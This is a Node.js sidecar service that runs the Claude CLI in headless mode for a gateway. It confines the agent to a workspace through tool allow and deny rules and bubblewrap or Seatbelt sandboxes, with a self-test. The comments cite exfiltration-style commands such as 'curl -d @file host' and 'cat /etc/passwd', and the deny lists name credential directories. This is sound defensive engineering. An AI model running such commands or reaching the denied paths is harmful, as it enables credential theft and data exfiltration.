#!/usr/bin/env node
//
// claude-sdk-service — the host-level sidecar for kami-gateway's `claude-sdk`
// provider.
//
// WHY THIS EXISTS
// ---------------
// The gateway must not run subprocesses: it contains no os/exec, and in
// production systemd denies it the operator's home directory anyway
// (ProtectHome=yes), where the Claude login lives. But the Claude Agent SDK
// only bills against a **subscription seat** — "session usage" — when it runs
// as the local `claude` CLI under that OAuth login.
//
// So this small service owns the `claude` process and the login, and the
// gateway reaches it over loopback HTTP, exactly as internal/coderelay already
// does for the code service. Run it as your normal desktop user; run the
// gateway however you like.
//
// SUBSCRIPTION BILLING
// --------------------
// Two rules decide whether a run costs subscription usage or API credits:
//
//   1. `claude` must already be logged in on this machine: run `claude` once
//      interactively and `/login` with the account holding the subscription.
//      (`claude /status` should show your account under "Login method".)
//   2. ANTHROPIC_API_KEY must NOT be visible to the CLI. If it is set, it takes
//      precedence over the subscription and the run bills to that key instead.
//      This service therefore deletes it from the child's environment — see
//      childEnv() below. It also never passes --bare, which would disable OAuth
//      entirely and force API-key auth.
//
// USAGE
//   node sidecar/claude-sdk-service.js            # listens on 127.0.0.1:8081
//   PORT=9000 node sidecar/claude-sdk-service.js
//
// Requires Node 18+ and the `claude` CLI on PATH. No npm dependencies.

'use strict';

const http = require('node:http');
const { spawn } = require('node:child_process');
const path = require('node:path');
const os = require('node:os');
const fs = require('node:fs');
const { randomUUID } = require('node:crypto');

const PORT = Number(process.env.PORT || 8081);
const HOST = '127.0.0.1'; // loopback only: this process can spend your subscription
const CLAUDE_BIN = process.env.CLAUDE_BIN || 'claude';
const RUN_TIMEOUT_MS = Number(process.env.CLAUDE_TIMEOUT_MS || 10 * 60 * 1000);
const MAX_BODY_BYTES = 4 * 1024 * 1024;

// SANDBOXING
// ----------
// The SDK runs as your own user, so by default it can reach everything you can.
// The gateway's whole premise is that the agent only touches its own workspace,
// so this service locks the CLI down to the cwd it is handed.
//
// Three things enforce that, and they matter in this order:
//
//   1. Bash is NOT in the allow-list, and is explicitly denied. This is the
//      important one. Read/Write/Edit obey path rules, but a shell does not:
//      `cat /etc/passwd` or `curl -d @file host` sail straight past any
//      Read() rule. A shell cannot be confined to a directory by permission
//      rules alone, so it is off entirely rather than whitelisted.
//   2. deny rules beat allow rules, so absolute (//**), home (~/**) and
//      parent (../**) paths are denied outright — that closes the traversal
//      hole even though the allow rules are scoped to ./**.
//   3. --permission-mode dontAsk auto-denies anything not explicitly allowed,
//      which is what you want when nobody is at a terminal to answer a prompt.
//
// Set CLAUDE_ALLOWED_TOOLS to override the tool list, or CLAUDE_UNSAFE=1 to
// drop the sandbox entirely (don't, unless you know exactly why).
const ALLOWED_TOOLS =
  process.env.CLAUDE_ALLOWED_TOOLS || 'Read,Write,Edit,Glob,Grep';

// UNSAFE disables the confinement above. It exists so the escape hatch is
// explicit and greppable rather than someone quietly editing the allow-list.
const UNSAFE = process.env.CLAUDE_UNSAFE === '1';

// Tools that can reach outside the workspace no matter what path rules say:
// a shell, and the two network tools. Denied unless explicitly re-enabled.
const ESCAPING_TOOLS = ['Bash', 'WebFetch', 'WebSearch', 'NotebookEdit'];

// OS-LEVEL CONFINEMENT
// --------------------
// Permission rules alone CANNOT confine writes to a directory. This was tested
// against CLI 2.1.179, and the result is a dead end by construction:
//
//   * scoped allow rules (Write(<ws>/**)) do not stop a write elsewhere;
//   * the only rule that does stop it, Write(//**), matches every absolute
//     path — including the workspace's own — and deny beats allow with no
//     carve-out, so it locks the agent out of the directory it must use.
//
// So the CLI is wrapped in a kernel-enforced sandbox that makes the filesystem
// read-only apart from the workspace. A write outside then fails at the syscall
// regardless of what the model decides to attempt. Permission rules stay on as
// defence in depth (and to keep the shell off), but this is the layer that
// actually holds.
//
// Two backends, picked by platform:
//   linux  -> bubblewrap (`bwrap`), if installed
//   darwin -> sandbox-exec (Seatbelt), part of the base system
//
// Set CLAUDE_NO_SANDBOX=1 to skip it (the run then relies on rules alone, and a
// warning is logged). CLAUDE_NO_BWRAP=1 is honoured as the older spelling.
function spawnSyncOk(bin, args) {
  try {
    return require('node:child_process').spawnSync(bin, args, { stdio: 'ignore' }).status === 0;
  } catch {
    return false;
  }
}

const SANDBOX_OPT_OUT =
  process.env.CLAUDE_NO_SANDBOX === '1' || process.env.CLAUDE_NO_BWRAP === '1';

// SANDBOX_KIND is 'bwrap', 'seatbelt', or '' when nothing is available.
const SANDBOX_KIND = (() => {
  if (SANDBOX_OPT_OUT) return '';
  if (process.platform === 'linux' && spawnSyncOk('bwrap', ['--version'])) return 'bwrap';
  // sandbox-exec ships with macOS. `-n no-write` is a built-in named profile,
  // so this probes the binary without needing a profile of our own.
  if (process.platform === 'darwin' && fs.existsSync('/usr/bin/sandbox-exec')) return 'seatbelt';
  return '';
})();

// seatbeltProfile builds the macOS Seatbelt policy: allow everything by
// default (the CLI must read system libraries and reach the network), then deny
// every write and re-allow only the paths that must be writable.
//
// Paths come in through -D parameters rather than being interpolated into the
// profile text, so a directory containing quotes or parens cannot break out of
// the S-expression. `subpath` matches a directory and everything beneath it.
//
// macOS resolves symlinks before matching, so /tmp and /var must be named in
// their /private forms as well — omitting those is the classic reason a
// Seatbelt profile denies writes it looks like it should allow.
const SEATBELT_PROFILE = `(version 1)
(allow default)
(deny file-write*)
(allow file-write* (subpath (param "WS")))
(allow file-write* (subpath (param "CLAUDE_DIR")))
(allow file-write* (literal (param "CLAUDE_JSON")))
(allow file-write* (subpath "/tmp"))
(allow file-write* (subpath "/private/tmp"))
(allow file-write* (subpath "/var/folders"))
(allow file-write* (subpath "/private/var/folders"))
(allow file-write* (literal "/dev/null"))
(allow file-write* (literal "/dev/zero"))
(allow file-write* (literal "/dev/stdout"))
(allow file-write* (literal "/dev/stderr"))
(allow file-write* (literal "/dev/tty"))
`;

// seatbeltArgs builds the `sandbox-exec` prefix. The CLI's own state directory
// stays writable so sessions can be resumed, exactly as under bubblewrap.
function seatbeltArgs(cwd) {
  const home = os.homedir();
  return [
    '-p', SEATBELT_PROFILE,
    '-D', `WS=${cwd}`,
    '-D', `CLAUDE_DIR=${path.join(home, '.claude')}`,
    '-D', `CLAUDE_JSON=${path.join(home, '.claude.json')}`,
    '--',
  ];
}

// bwrapArgs builds the bubblewrap prefix: everything read-only, the workspace
// writable, plus the few paths the CLI genuinely needs to write to (its own
// config/cache under $HOME, and a private /tmp).
function bwrapArgs(cwd) {
  const home = process.env.HOME || '/root';
  return [
    '--ro-bind', '/', '/',
    '--dev', '/dev',
    '--proc', '/proc',
    '--tmpfs', '/tmp',
    // The workspace: the one writable location.
    '--bind', cwd, cwd,
    // The CLI needs to write its own session/config state to resume sessions.
    '--bind-try', `${home}/.claude`, `${home}/.claude`,
    '--bind-try', `${home}/.claude.json`, `${home}/.claude.json`,
    '--chdir', cwd,
    '--unsetenv', 'ANTHROPIC_API_KEY',
    '--unsetenv', 'ANTHROPIC_AUTH_TOKEN',
    '--',
  ];
}

// sandboxSettings builds the --settings payload confining the run to `cwd`.
// Paths are anchored absolutely so the rules do not depend on how the CLI
// resolves relative prefixes.
// WORKSPACE_ROOT optionally pins every run under one directory, so even a
// caller that asks for the wrong cwd cannot move the sandbox somewhere else.
// Unset means "trust the gateway's cwd", which is fine when the only client is
// the local gateway; set it for defence in depth.
const WORKSPACE_ROOT = process.env.CLAUDE_WORKSPACE_ROOT
  ? path.resolve(process.env.CLAUDE_WORKSPACE_ROOT)
  : '';

// resolveCwd validates the requested working directory. It rejects a relative
// path (the sandbox rules are absolute) and, when WORKSPACE_ROOT is set, any
// directory outside it — including via `..`, since resolve() normalises first.
function resolveCwd(requested) {
  const dir = path.resolve(requested || process.cwd());
  if (WORKSPACE_ROOT && dir !== WORKSPACE_ROOT && !dir.startsWith(WORKSPACE_ROOT + path.sep)) {
    throw new Error(`cwd ${dir} is outside CLAUDE_WORKSPACE_ROOT ${WORKSPACE_ROOT}`);
  }
  return dir;
}

function sandboxSettings(cwd) {
  const dir = cwd.replace(/\/+$/, '');
  return {
    permissions: {
      allow: [`Read(${dir}/**)`, `Edit(${dir}/**)`, `Write(${dir}/**)`, `Glob(${dir}/**)`, `Grep(${dir}/**)`],
      deny: [
        // Tools no path rule can constrain.
        ...ESCAPING_TOOLS,
        // Sensitive locations, denied by name. Note there is deliberately NO
        // blanket `Read(//**)` here: deny beats allow, so a rule matching every
        // absolute path would also match the workspace's own absolute path and
        // lock the agent out of the directory it is supposed to work in.
        // Confinement comes from the scoped allow rules plus
        // blockReadsOutsideWorkingDirectories below.
        'Read(~/.ssh/**)', 'Edit(~/.ssh/**)', 'Write(~/.ssh/**)',
        'Read(~/.aws/**)', 'Edit(~/.aws/**)', 'Write(~/.aws/**)',
        'Read(~/.claude/**)', 'Edit(~/.claude/**)', 'Write(~/.claude/**)',
        'Read(//etc/**)', 'Edit(//etc/**)', 'Write(//etc/**)',
        'Read(../**)', 'Edit(../**)', 'Write(../**)',
      ],
      // Belt-and-braces: refuse reads outside the working directory even for
      // the CLI's built-in "read-only" command set.
      blockReadsOutsideWorkingDirectories: true,
    },
  };
}

// childEnv strips the API key so the CLI falls back to the subscription OAuth
// login. This is the single most important line for "session usage" billing.
function childEnv() {
  const env = { ...process.env };
  delete env.ANTHROPIC_API_KEY;
  delete env.ANTHROPIC_AUTH_TOKEN;
  return env;
}

// buildArgs turns a gateway request into headless CLI flags.
function buildArgs(req) {
  const args = ['-p', '--output-format', 'json'];

  if (req.session_id) {
    args.push('--resume', req.session_id);
  }
  if (req.system_prompt) {
    // Appended, not replaced: the agent's SOUL.md rides along with the SDK's
    // own tool instructions rather than displacing them.
    args.push('--append-system-prompt', req.system_prompt);
  }
  if (req.model) args.push('--model', req.model);
  if (req.max_turns) args.push('--max-turns', String(req.max_turns));

  if (UNSAFE) {
    // Explicitly opted out of confinement.
    args.push('--allowedTools', process.env.CLAUDE_ALLOWED_TOOLS || 'Read,Write,Edit,Glob,Grep,Bash,WebFetch,WebSearch');
    args.push('--permission-mode', 'acceptEdits');
    return args;
  }

  args.push('--allowedTools', ALLOWED_TOOLS);
  // dontAsk: deny anything not explicitly allowed, rather than blocking on a
  // prompt nobody is there to answer.
  args.push('--permission-mode', 'dontAsk');
  args.push('--settings', JSON.stringify(sandboxSettings(req.cwd || process.cwd())));
  return args;
}

// runClaude spawns the CLI, writes the prompt on stdin (so prompt length is not
// bounded by argv limits), and resolves with the parsed JSON result envelope.
function runClaude(req) {
  return new Promise((resolve, reject) => {
    let cwd;
    try {
      cwd = resolveCwd(req.cwd);
    } catch (err) {
      reject(err);
      return;
    }
    const claudeArgs = buildArgs({ ...req, cwd });

    // Under a sandbox the real command becomes `<wrapper> … -- claude …`.
    let bin = CLAUDE_BIN;
    let args = claudeArgs;
    if (!UNSAFE && SANDBOX_KIND === 'bwrap') {
      bin = 'bwrap';
      args = [...bwrapArgs(cwd), CLAUDE_BIN, ...claudeArgs];
    } else if (!UNSAFE && SANDBOX_KIND === 'seatbelt') {
      bin = '/usr/bin/sandbox-exec';
      args = [...seatbeltArgs(cwd), CLAUDE_BIN, ...claudeArgs];
    }

    const child = spawn(bin, args, {
      cwd,
      env: childEnv(),
      stdio: ['pipe', 'pipe', 'pipe'],
    });

    let stdout = '';
    let stderr = '';
    let settled = false;

    const timer = setTimeout(() => {
      if (settled) return;
      settled = true;
      child.kill('SIGTERM');
      reject(new Error(`claude run timed out after ${RUN_TIMEOUT_MS}ms`));
    }, RUN_TIMEOUT_MS);

    child.stdout.on('data', (d) => (stdout += d));
    child.stderr.on('data', (d) => (stderr += d));

    child.on('error', (err) => {
      if (settled) return;
      settled = true;
      clearTimeout(timer);
      reject(new Error(`cannot start ${bin}: ${err.message}`));
    });

    child.on('close', (code) => {
      if (settled) return;
      settled = true;
      clearTimeout(timer);
      let parsed;
      try {
        parsed = JSON.parse(stdout);
      } catch {
        reject(
          new Error(
            `claude exited ${code} without JSON output. stderr: ${stderr.trim().slice(0, 500)}`,
          ),
        );
        return;
      }
      resolve(parsed);
    });

    child.stdin.end(req.prompt, 'utf8');
  });
}

function sendJSON(res, status, obj) {
  const body = JSON.stringify(obj);
  res.writeHead(status, {
    'Content-Type': 'application/json',
    'Content-Length': Buffer.byteLength(body),
  });
  res.end(body);
}

// --selftest verifies the sandbox actually holds on THIS machine, without
// needing the gateway, Telegram, or an API call. It writes inside a scratch
// workspace (must succeed) and outside it (must fail), and reports both.
//
// This matters most on macOS: the Seatbelt path was written on Linux and could
// not be executed there, so run `node sidecar/claude-sdk-service.js --selftest`
// on the Mac before trusting it.
function selfTest() {
  const { spawnSync } = require('node:child_process');
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'kami-sbtest-'));
  const ws = path.join(tmp, 'ws');
  fs.mkdirSync(ws);
  const outside = path.join(tmp, 'OUTSIDE.txt');

  console.log(`platform: ${process.platform}`);
  console.log(`sandbox backend: ${SANDBOX_KIND || '(none)'}`);
  if (!SANDBOX_KIND) {
    console.log('\nFAIL: no sandbox backend active — writes outside the workspace are NOT prevented.');
    if (process.platform === 'darwin') console.log('      expected /usr/bin/sandbox-exec to exist.');
    if (process.platform === 'linux') console.log('      install bubblewrap (bwrap).');
    process.exitCode = 1;
    return;
  }

  // Run a shell through the same wrapper the CLI gets, and try both writes.
  const script = `echo inside > '${path.join(ws, 'in.txt')}' 2>&1; echo outside > '${outside}' 2>&1; exit 0`;
  const prefix = SANDBOX_KIND === 'bwrap' ? ['bwrap', bwrapArgs(ws)] : ['/usr/bin/sandbox-exec', seatbeltArgs(ws)];
  const r = spawnSync(prefix[0], [...prefix[1], '/bin/sh', '-c', script], { encoding: 'utf8' });

  if (r.error) {
    console.log(`\nFAIL: could not start the sandbox: ${r.error.message}`);
    process.exitCode = 1;
    return;
  }
  const insideOK = fs.existsSync(path.join(ws, 'in.txt'));
  const leaked = fs.existsSync(outside);

  console.log(`\n  write INSIDE workspace:  ${insideOK ? 'OK (allowed)' : 'FAILED (should be allowed)'}`);
  console.log(`  write OUTSIDE workspace: ${leaked ? 'LEAKED (should be blocked)' : 'blocked'}`);
  if (r.stderr && r.stderr.trim()) {
    console.log(`\n  stderr from the sandboxed shell:\n    ${r.stderr.trim().split('\n').join('\n    ')}`);
  }

  fs.rmSync(tmp, { recursive: true, force: true });
  if (insideOK && !leaked) {
    console.log('\nPASS: the sandbox confines writes to the workspace.');
  } else {
    console.log('\nFAIL: the sandbox is not behaving as intended — do not rely on it.');
    process.exitCode = 1;
  }
}

if (process.argv.includes('--selftest')) {
  selfTest();
  return;
}

const server = http.createServer((httpReq, res) => {
  if (httpReq.method !== 'POST' || !httpReq.url.startsWith('/claude')) {
    sendJSON(res, 404, { error: 'POST /claude only' });
    return;
  }

  let raw = '';
  let tooBig = false;
  httpReq.on('data', (chunk) => {
    if (tooBig) return;
    raw += chunk;
    if (raw.length > MAX_BODY_BYTES) {
      tooBig = true;
      sendJSON(res, 413, { error: 'request too large' });
      httpReq.destroy();
    }
  });

  httpReq.on('end', async () => {
    if (tooBig) return;
    let req;
    try {
      req = JSON.parse(raw);
    } catch {
      sendJSON(res, 400, { error: 'body is not valid JSON' });
      return;
    }
    if (!req.prompt || !String(req.prompt).trim()) {
      sendJSON(res, 400, { error: 'prompt must not be empty' });
      return;
    }

    const id = randomUUID().slice(0, 8);
    const label = req.session_id ? `resume ${req.session_id.slice(0, 8)}` : 'new session';
    console.log(`[${id}] ${label} :: ${String(req.prompt).slice(0, 100)}`);

    try {
      const out = await runClaude(req);
      console.log(
        `[${id}] done session=${out.session_id} turns=${out.num_turns} cost=$${out.total_cost_usd ?? 0}`,
      );
      // Forward the CLI's own result envelope; the Go client reads exactly
      // these field names.
      sendJSON(res, 200, {
        result: out.result ?? '',
        session_id: out.session_id ?? '',
        is_error: Boolean(out.is_error),
        num_turns: out.num_turns ?? 0,
        total_cost_usd: out.total_cost_usd ?? 0,
      });
    } catch (err) {
      console.error(`[${id}] failed: ${err.message}`);
      sendJSON(res, 200, { error: err.message });
    }
  });
});

server.listen(PORT, HOST, () => {
  console.log(`claude-sdk-service listening on http://${HOST}:${PORT}/claude`);
  console.log(`  binary: ${CLAUDE_BIN}`);
  if (UNSAFE) {
    console.log('  ⚠  CLAUDE_UNSAFE=1 — sandbox DISABLED, Bash and full filesystem allowed');
  } else {
    console.log(`  allowed tools: ${ALLOWED_TOOLS}  (Bash/WebFetch/WebSearch denied)`);
    console.log('  sandbox: confined to each request\'s workspace directory');
    if (SANDBOX_KIND === 'bwrap') {
      console.log('  sandbox: bubblewrap — filesystem read-only except the workspace (kernel-enforced)');
    } else if (SANDBOX_KIND === 'seatbelt') {
      console.log('  sandbox: sandbox-exec (Seatbelt) — writes confined to the workspace (kernel-enforced)');
    } else if (SANDBOX_OPT_OUT) {
      console.log('  sandbox: DISABLED by CLAUDE_NO_SANDBOX — writes outside the workspace');
      console.log('           are NOT prevented.');
    } else if (process.platform === 'linux') {
      console.log('  sandbox: NONE — bwrap not found; writes outside the workspace are NOT');
      console.log('           reliably prevented. Install bubblewrap.');
    } else if (process.platform === 'darwin') {
      console.log('  sandbox: NONE — /usr/bin/sandbox-exec missing; writes outside the');
      console.log('           workspace are NOT reliably prevented.');
    } else {
      console.log(`  sandbox: NONE — no supported backend on ${process.platform}; writes`);
      console.log('           outside the workspace are NOT reliably prevented.');
    }
  }
  if (WORKSPACE_ROOT) console.log(`  workspace root: ${WORKSPACE_ROOT}`);
  if (process.env.ANTHROPIC_API_KEY) {
    console.log(
      '  note: ANTHROPIC_API_KEY is set in this shell but is stripped from the',
    );
    console.log(
      '        claude child process, so runs bill to your subscription seat.',
    );
  }
});
